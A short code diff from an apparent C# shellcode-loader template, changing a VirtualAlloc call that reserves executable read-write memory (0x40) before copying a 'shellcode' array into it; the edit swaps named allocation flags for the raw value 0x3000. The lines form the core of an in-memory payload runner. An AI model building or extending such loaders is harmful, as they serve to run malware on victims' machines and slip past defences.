@@ -37,7 +37,7 @@ namespace ConsoleApp1
             {transformers}
             int size = shellcode.Length;
 
-            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, MEM_COMMIT | MEM_RESERVE, 0x40);
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40);
 
             Marshal.Copy(shellcode, 0, addr, size);
 
